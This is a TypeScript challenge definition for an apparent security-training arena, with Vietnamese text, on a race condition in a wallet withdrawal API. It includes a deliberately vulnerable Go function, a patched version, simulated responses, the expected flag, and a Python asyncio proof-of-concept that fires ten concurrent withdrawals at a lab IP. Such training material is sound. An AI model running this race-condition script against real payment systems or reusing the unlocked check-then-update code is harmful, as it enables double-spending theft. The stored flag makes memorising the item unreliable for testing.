import type { ArenaChallenge } from '../../types';

export const challengeRaceCondition: ArenaChallenge = {
  id: 'bb-race-03-limit-overrun',
  title: 'Financial Concurrency Race Condition & Balance Overrun',
  category: 'bug-bounty',
  severity: 'high',
  cvssScore: 8.5,
  bountyReward: 3500,
  xpReward: 650,
  estimatedMinutes: 15,
  targetHost: '10.0.4.50',
  targetPort: 443,
  tagline:
    'Khai thác thời gian chênh lệch (TOCTOU) giữa lúc kiểm tra số dư và trừ tiền trong cơ sở dữ liệu.',
  scenarioBriefing:
    'Cổng thanh toán xử lý giao dịch chuyển tiền qua 2 câu lệnh SQL riêng biệt: SELECT balance FROM accounts và UPDATE accounts SET balance = balance - amount. Khi gửi 10 request đồng thời qua HTTP Repeater với kết nối TCP burst, kẻ tấn công có thể rút tiền vượt quá số dư hiện có.',
  keyObjectives: [
    'Gửi 5–10 request chuyển tiền đồng thời qua HTTP Repeater với cùng Transaction Token.',
    'Khai thác thành công trạng thái Limit-Overrun để số dư vượt âm.',
    'Nhận Flag xác nhận từ phản hồi hệ thống.',
  ],
  expectedFlag: 'OS_0DAY{concurrency_race_condition_double_spend_success}',
  firstBloodHolder: {
    handle: '@red_samurai',
    timeRecord: '07m 30s',
  },
  supportedTools: ['repeater', 'diff'],
  defaultTool: 'repeater',
  repeaterConfig: {
    defaultMethod: 'POST',
    defaultUrl: '/api/v1/wallet/withdraw',
    defaultRawHeaders:
      'Host: 10.0.4.50:443\n' +
      'Authorization: Bearer test_operator_token\n' +
      'Content-Type: application/json\n' +
      'X-Concurrency-Burst: true\n' +
      'Connection: keep-alive',
    defaultBody: '{"amount": 1000, "recipient_account": "ACC-998822"}',
    targetEndpoint: 'https://10.0.4.50/api/v1/wallet/withdraw',
    simulatedResponses: {
      baseResponse: {
        statusCode: 200,
        statusText: 'OK',
        headers: { 'Content-Type': 'application/json' },
        body: '{"status": "SUCCESS", "remaining_balance": 0, "message": "Withdrawal of $1000 processed."}',
      },
      exploitedResponse: {
        statusCode: 200,
        statusText: 'OK (RACE DETECTED)',
        headers: {
          'Content-Type': 'application/json',
          'X-Race-Condition-Exploited': '5x_CONCURRENT_TRANSACTIONS_ACCEPTED',
        },
        body:
          '{\n' +
          '  "status": "LIMIT_OVERRUN_SUCCESS",\n' +
          '  "transactions_executed": 5,\n' +
          '  "total_withdrawn": 5000,\n' +
          '  "initial_balance": 1000,\n' +
          '  "final_balance": -4000,\n' +
          '  "bounty_flag": "OS_0DAY{concurrency_race_condition_double_spend_success}"\n' +
          '}',
        proofFlag: 'OS_0DAY{concurrency_race_condition_double_spend_success}',
      },
    },
  },
  diffConfig: {
    filename: 'wallet_service.go',
    language: 'go',
    vulnerableLineStart: 15,
    vulnerableLineEnd: 24,
    rootCauseExplanation:
      'Không sử dụng câu lệnh khóa dòng bi-directional (SELECT FOR UPDATE) hoặc Optimistic Concurrency Control (OCC) trong transaction cơ sở dữ liệu, tạo ra khoảng trống Time-of-Check to Time-of-Use (TOCTOU).',
    taintSink: 'db.Exec("UPDATE accounts SET balance = balance - ?", amount)',
    vulnerableCode:
      '// vulnerable_wallet.go\n' +
      'func ProcessWithdraw(db *sql.DB, accountID int, amount float64) error {\n' +
      '    var balance float64\n' +
      '    // LỖ HỔNG: Đọc số dư không có Row Lock (SELECT FOR UPDATE)!\n' +
      '    db.QueryRow("SELECT balance FROM accounts WHERE id = ?", accountID).Scan(&balance)\n' +
      '    if balance < amount {\n' +
      '        return errors.New("insufficient funds")\n' +
      '    }\n' +
      '    time.Sleep(50 * time.Millisecond) // Giả lập độ trễ I/O\n' +
      '    _, err := db.Exec("UPDATE accounts SET balance = balance - ? WHERE id = ?", amount, accountID)\n' +
      '    return err\n' +
      '}',
    patchedCode:
      '// patched_wallet.go (Atomic Row Lock Fix)\n' +
      'func ProcessWithdrawSafe(tx *sql.Tx, accountID int, amount float64) error {\n' +
      '    var balance float64\n' +
      '    // BẢN VÁ: Khóa dòng ngay lập tức bằng SELECT FOR UPDATE trong Transaction\n' +
      '    err := tx.QueryRow("SELECT balance FROM accounts WHERE id = ? FOR UPDATE", accountID).Scan(&balance)\n' +
      '    if err != nil || balance < amount {\n' +
      '        return errors.New("insufficient funds or account locked")\n' +
      '    }\n' +
      '    _, err = tx.Exec("UPDATE accounts SET balance = balance - ? WHERE id = ?", amount, accountID)\n' +
      '    return err\n' +
      '}',
  },
  writeup: {
    title: 'Concurrency Limit-Overrun Race Conditions in Modern Web APIs',
    cvssVector: 'CVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:N/VC:N/VI:H/VA:N/SC:N/SI:H/SA:N',
    vulnerabilityOverview:
      'Race conditions trong API tài chính xảy ra khi nhiều luồng thực thi đồng thời kiểm tra cùng một trạng thái trước khi bất kỳ luồng nào kịp cập nhật kết quả.',
    rootCauseAnalysis:
      'Sự thiếu vắng các cơ chế đồng bộ hóa nguyên tử (Atomic locks / Mutex / Database Row Locking) cho phép kẻ tấn công gửi đồng thời nhiều gói tin qua kỹ thuật TCP Packet Alignment để vượt giới hạn.',
    exploitChainWalkthrough: [
      'Bước 1: Soạn thảo 10 HTTP requests rút tiền trong HTTP Repeater.',
      'Bước 2: Gửi đồng thời bằng single-packet attack hoặc HTTP/2 multiplexing.',
      'Bước 3: Nhận phản hồi nhiều giao dịch thành công dù số dư chỉ đủ cho 1 giao dịch.',
    ],
    weaponizedPoC:
      'import asyncio, aiohttp\nasync def attack():\n    async with aiohttp.ClientSession() as s:\n        tasks = [s.post("https://10.0.4.50/api/v1/wallet/withdraw", json={"amount": 1000}) for _ in range(10)]\n        await asyncio.gather(*tasks)\nasyncio.run(attack())',
    remediationSnippet:
      '// Sử dụng câu lệnh UPDATE nguyên tử có điều kiện:\nUPDATE accounts SET balance = balance - 1000 WHERE id = 123 AND balance >= 1000;\n// Kiểm tra RowsAffected == 1',
  },
};
